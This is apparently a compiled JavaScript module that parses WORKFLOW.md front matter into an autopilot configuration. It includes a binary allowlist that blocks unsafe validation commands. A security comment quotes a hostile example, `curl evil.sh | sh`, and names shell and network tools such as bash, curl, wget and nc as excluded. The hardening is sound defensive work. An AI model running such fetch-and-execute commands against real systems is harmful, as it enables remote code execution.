"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.DEFAULT_WORKFLOW_CONFIG = void 0;
exports.loadWorkflowConfig = loadWorkflowConfig;
/**
 * M2.2: Workflow config parser
 *
 * Parses WORKFLOW.md YAML front matter for autopilot configuration.
 * Lookup order: workspacePath/WORKFLOW.md -> baseRepoPath/WORKFLOW.md -> default config.
 */
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const model_routing_1 = require("./model-routing");
exports.DEFAULT_WORKFLOW_CONFIG = {
    version: 1,
    source: 'default',
    maxConcurrent: 5,
    maxRetries: 3,
    stallTimeoutMs: 300_000,
    maxRetryBackoffMs: 300_000,
    workspace: {
        root: '.matrix/autopilot-worktrees',
        cleanup: 'manual',
        branchPrefix: 'autopilot',
        allowDirtyBase: false,
    },
    validation: {
        commands: [],
        failOnOptional: false,
    },
    destructiveGit: {
        allow: false,
    },
    warnings: [],
};
/**
 * S1 (audit 2026-06-30): allowlist of binaries permitted in WORKFLOW.md
 * `validation.commands`. WORKFLOW.md is an attacker-controllable input (it lives
 * in the workspace, not the operator's config), and these commands run via
 * execFile on the autopilot `complete` path — without this filter, a malicious
 * workspace could achieve RCE by committing `command: "curl evil.sh | sh"`.
 *
 * Fail-closed: anything not listed is dropped + warned. Intentionally excludes
 * `bash`/`sh`/`curl`/`wget`/`nc`/arbitrary binaries. Residual surface: an
 * allowlisted interpreter (e.g. `python -c "..."`) can still run arbitrary code
 * via its own flags; narrowing that requires argument inspection, tracked as a
 * follow-up. The binary gate already removes the "any binary, zero friction"
 * RCE path that existed before.
 */
const ALLOWED_VALIDATION_BINARIES = new Set([
    'npm', 'pnpm', 'yarn', 'npx', 'node', 'node.exe',
    'tsc', 'tsx', 'eslint', 'prettier', 'markdownlint', 'markdownlint-cli2',
    'vitest', 'jest', 'mocha', 'vite', 'webpack', 'rollup', 'esbuild',
    'go', 'cargo', 'rustc',
    'python', 'python3', 'pytest', 'pip', 'pip3',
    'make', 'cmake', 'dotnet', 'msbuild',
    'gradle', 'mvn', 'rake', 'bundle', 'swift', 'xcodebuild',
]);
/**
 * Extract the binary (argv[0]) from a command string, honouring single/double
 * quotes the same way parseCommandArgs does at execution time, so the gate
 * decides on exactly the token that execFile will spawn.
 */
function extractBinary(command) {
    const s = command.trim();
    if (!s)
        return undefined;
    let bin = '';
    let inSingle = false;
    let inDouble = false;
    for (let i = 0; i < s.length; i++) {
        const c = s[i];
        if (c === '"' && !inSingle)
            inDouble = !inDouble;
        else if (c === "'" && !inDouble)
            inSingle = !inSingle;
        else if (c === ' ' && !inSingle && !inDouble)
            break;
        else
            bin += c;
    }
    return bin || undefined;
}
/**
 * S1: drop validation commands whose binary is not on the allowlist.
 * Mutates `warnings` with one entry per dropped command for observability.
 */
function filterValidationCommands(commands, warnings) {
    const kept = [];
    for (const cmd of commands) {
        const bin = extractBinary(cmd.command)?.toLowerCase();
        if (bin && ALLOWED_VALIDATION_BINARIES.has(bin)) {
            kept.push(cmd);
        }
        else {
            warnings.push(`Disallowed validation binary "${bin ?? '(empty)'}" in command "${cmd.command.substring(0, 80)}" — dropped (S1 fail-closed)`);
        }
    }
    return kept;
}
/**
 * Parse a YAML-like autopilot section from front matter.
 * Minimal parser — only handles the autopilot schema we define.
 * Not a general-purpose YAML parser.
 */
function parseAutopilotSection(raw) {
    const warnings = [];
    const result = {};
    // Track unknown fields
    const knownKeys = new Set([
        'version', 'max_concurrent', 'max_retries',
        'stall_timeout_ms', 'max_retry_backoff_ms', 'workspace', 'validation',
        'destructive_git', 'model_routing',
    ]);
    for (const key of Object.keys(raw)) {
        if (!knownKeys.has(key)) {
            warnings.push(`Unknown field: ${key}`);
        }
    }
    if ('version' in raw) {
        if (raw.version !== 1) {
            warnings.push(`Unsupported version: ${raw.version}, expected 1`);
        }
        result.version = 1;
    }
    else {
        warnings.push('Missing version field, defaulting to 1');
    }
    if ('max_concurrent' in raw && typeof raw.max_concurrent === 'number') {
        result.maxConcurrent = raw.max_concurrent;
    }
    if ('max_retries' in raw && typeof raw.max_retries === 'number') {
        result.maxRetries = raw.max_retries;
    }
    if ('stall_timeout_ms' in raw && typeof raw.stall_timeout_ms === 'number') {
        result.stallTimeoutMs = raw.stall_timeout_ms;
    }
    if ('max_retry_backoff_ms' in raw && typeof raw.max_retry_backoff_ms === 'number') {
        result.maxRetryBackoffMs = raw.max_retry_backoff_ms;
    }
    if ('workspace' in raw && typeof raw.workspace === 'object' && raw.workspace !== null) {
        const ws = raw.workspace;
        result.workspace = {
            root: typeof ws.root === 'string' ? ws.root : exports.DEFAULT_WORKFLOW_CONFIG.workspace.root,
            cleanup: ws.cleanup === 'delete_on_done' ? 'delete_on_done' : 'manual',
            branchPrefix: typeof ws.branch_prefix === 'string' ? ws.branch_prefix : 'autopilot',
            baseRef: typeof ws.base_ref === 'string' ? ws.base_ref : undefined,
            allowDirtyBase: ws.allow_dirty_base === true,
        };
    }
    if ('validation' in raw && typeof raw.validation === 'object' && raw.validation !== null) {
        const val = raw.validation;
        const commands = [];
        if (Array.isArray(val.commands)) {
            for (const cmd of val.commands) {
                if (typeof cmd === 'object' && cmd !== null) {
                    const c = cmd;
                    if (typeof c.id === 'string' && typeof c.command === 'string') {
                        commands.push({
                            id: c.id,
                            command: c.command,
                            timeoutMs: typeof c.timeout_ms === 'number' ? c.timeout_ms : 120_000,
                            required: c.required !== false,
                        });
                    }
                }
            }
        }
        result.validation = {
            commands: filterValidationCommands(commands, warnings),
            failOnOptional: val.fail_on_optional === true,
        };
    }
    if ('destructive_git' in raw && typeof raw.destructive_git === 'object' && raw.destructive_git !== null) {
        const dg = raw.destructive_git;
        result.destructiveGit = {
            allow: dg.allow === true,
        };
    }
    if ('model_routing' in raw) {
        const routing = (0, model_routing_1.parseModelRouting)(raw.model_routing);
        if (routing)
            result.modelRouting = routing;
    }
    return { config: result, warnings };
}
/**
 * Extract YAML front matter from markdown content.
 * Returns the parsed object or null if no valid front matter found.
 */
function extractFrontMatter(content) {
    // Normalise CRLF → LF so Windows-edited files parse identically to Unix files (X-7, X-8)
    const normalised = content.replace(/\r\n/g, '\n');
    const match = normalised.match(/^---\s*\n([\s\S]*?)\n---/);
    if (!match)
        return null;
    const yaml = match[1];
    // Minimal YAML parsing for our flat autopilot schema
    // We use a simple approach: find the autopilot: key and parse its block
    try {
        return parseSimpleYaml(yaml);
    }
    catch {
        return null;
    }
}
/**
 * Very simple YAML parser that handles our specific autopilot schema.
 * Not a general YAML parser — only handles nested objects, arrays, and scalars.
 */
function parseSimpleYaml(yaml) {
    const lines = yaml.split('\n');
    const root = {};
    let i = 0;
    function parseValue(indent) {
        if (i >= lines.length)
            return null;
        const line = lines[i];
        const trimmed = line.trimStart();
        if (trimmed === '' || trimmed.startsWith('#')) {
            i++;
            return parseValue(indent);
        }
        // Array item
        if (trimmed.startsWith('- ')) {
            const items = [];
            while (i < lines.length) {
                const l = lines[i];
                const t = l.trimStart();
                const currentIndent = l.length - t.length;
                if (currentIndent < indent)
                    break;
                if (t.startsWith('- ')) {
                    i++;
                    const itemStr = t.substring(2).trim();
                    if (itemStr.includes(':')) {
                        // Inline object or nested object
                        // Check if next lines are indented further
                        const itemObj = {};
                        // Try inline key: value
                        const inlineMatch = itemStr.match(/^(\w[\w_-]*):\s*(.*)/);
                        if (inlineMatch) {
                            const k = inlineMatch[1];
                            const v = inlineMatch[2].trim();
                            if (v === '' || v === '|' || v === '>') {
                                // Nested object
                                const subIndent = currentIndent + 2;
                                const sub = {};
                                while (i < lines.length) {
                                    const sl = lines[i];
                                    const st = sl.trimStart();
                                    const si = sl.length - st.length;
                                    if (si < subIndent || st === '' || st.startsWith('#'))
                                        break;
                                    const kv = st.match(/^(\w[\w_-]*):\s*(.*)/);
                                    if (kv) {
                                        i++;
                                        const key = kv[1];
                                        const val = kv[2].trim();
                                        if (val === '') {
                                            // Deeper nesting — not needed for our schema
                                        }
                                        else {
                                            sub[key] = parseScalar(val);
                                        }
                                    }
                                    else {
                                        i++;
                                    }
                                }
                                itemObj[k] = sub;
                            }
                            else {
                                itemObj[k] = parseScalar(v);
                            }
                        }
                        // Continue parsing key: value pairs at this indent level
                        while (i < lines.length) {
                            const nl = lines[i];
                            const nt = nl.trimStart();
                            const ni = nl.length - nt.length;
                            const expectedIndent = currentIndent + 2;
                            if (ni < expectedIndent || nt === '' || nt.startsWith('#'))
                                break;
                            if (nt.startsWith('- '))
                                break;
                            const kv = nt.match(/^(\w[\w_-]*):\s*(.*)/);
                            if (kv) {
                                i++;
                                itemObj[kv[1]] = parseScalar(kv[2].trim());
                            }
                            else {
                                i++;
                            }
                        }
                        items.push(itemObj);
                    }
                    else {
                        items.push(parseScalar(itemStr));
                    }
                }
                else {
                    break;
                }
            }
            return items;
        }
        // Object: parse key: value pairs at this indent level
        const obj = {};
        while (i < lines.length) {
            const l = lines[i];
            const t = l.trimStart();
            const ci = l.length - t.length;
            if (ci < indent && l.trim() !== '')
                break;
            if (t === '' || t.startsWith('#')) {
                i++;
                continue;
            }
            if (t.startsWith('- '))
                break;
            const kv = t.match(/^(\w[\w_-]*):\s*(.*)/);
            if (kv) {
                const key = kv[1];
                const val = kv[2].trim();
                i++;
                if (val === '' || val === '|' || val === '>') {
                    // Nested block — check next line indent
                    if (i < lines.length) {
                        const nextLine = lines[i];
                        const nextIndent = nextLine.length - nextLine.trimStart().length;
                        if (nextIndent > ci) {
                            obj[key] = parseValue(nextIndent);
                        }
                        else {
                            obj[key] = null;
                        }
                    }
                    else {
                        obj[key] = null;
                    }
                }
                else {
                    obj[key] = parseScalar(val);
                }
            }
            else {
                i++;
            }
        }
        return obj;
    }
    // Parse root level
    while (i < lines.length) {
        const line = lines[i];
        const trimmed = line.trimStart();
        if (trimmed === '' || trimmed.startsWith('#')) {
            i++;
            continue;
        }
        const kv = trimmed.match(/^(\w[\w_-]*):\s*(.*)/);
        if (kv) {
            const key = kv[1];
            const val = kv[2].trim();
            i++;
            if (val === '' || val === '|' || val === '>') {
                // Nested block
                if (i < lines.length) {
                    const nextLine = lines[i];
                    const nextIndent = nextLine.length - nextLine.trimStart().length;
                    const currentIndent = line.length - trimmed.length;
                    if (nextIndent > currentIndent) {
                        root[key] = parseValue(nextIndent);
                    }
                    else {
                        root[key] = null;
                    }
                }
                else {
                    root[key] = null;
                }
            }
            else {
                root[key] = parseScalar(val);
            }
        }
        else {
            i++;
        }
    }
    return root;
}
function parseScalar(val) {
    if (val === 'true')
        return true;
    if (val === 'false')
        return false;
    if (val === 'null' || val === '~')
        return null;
    // Remove quotes
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
        return val.slice(1, -1);
    }
    // Try number
    const num = Number(val);
    if (!isNaN(num) && val !== '')
        return num;
    return val;
}
/**
 * Load workflow config from WORKFLOW.md in the given repo path.
 * Returns default config if no WORKFLOW.md exists or if parsing fails.
 */
function loadWorkflowConfig(baseRepoPath, workspacePath) {
    // Lookup order: workspacePath/WORKFLOW.md -> baseRepoPath/WORKFLOW.md -> default
    const searchPaths = workspacePath
        ? [path.join(workspacePath, 'WORKFLOW.md'), path.join(baseRepoPath, 'WORKFLOW.md')]
        : [path.join(baseRepoPath, 'WORKFLOW.md')];
    for (const filePath of searchPaths) {
        if (!fs.existsSync(filePath))
            continue;
        try {
            const content = fs.readFileSync(filePath, 'utf-8');
            const parsed = extractFrontMatter(content);
            if (!parsed || !('autopilot' in parsed)) {
                // File exists but no autopilot section — treat as missing
                continue;
            }
            const autopilot = parsed.autopilot;
            if (typeof autopilot !== 'object' || autopilot === null) {
                // Invalid autopilot section (e.g., autopilot: {})
                if (autopilot === null || (typeof autopilot === 'object' && Object.keys(autopilot).length === 0)) {
                    // autopilot: {} or autopilot: null — use defaults but mark as workflow_md source
                    return {
                        config: { ...exports.DEFAULT_WORKFLOW_CONFIG, source: 'workflow_md', warnings: [] },
                        warnings: [],
                    };
                }
                continue;
            }
            const { config: partial, warnings } = parseAutopilotSection(autopilot);
            const merged = {
                ...exports.DEFAULT_WORKFLOW_CONFIG,
                ...partial,
                source: 'workflow_md',
                workspace: { ...exports.DEFAULT_WORKFLOW_CONFIG.workspace, ...partial.workspace },
                validation: { ...exports.DEFAULT_WORKFLOW_CONFIG.validation, ...partial.validation },
                destructiveGit: { ...exports.DEFAULT_WORKFLOW_CONFIG.destructiveGit, ...partial.destructiveGit },
                warnings,
            };
            return { config: merged, warnings };
        }
        catch {
            // Parsing error — fallback to default
            continue;
        }
    }
    return { config: exports.DEFAULT_WORKFLOW_CONFIG, warnings: [] };
}
//# sourceMappingURL=workflow-config.js.map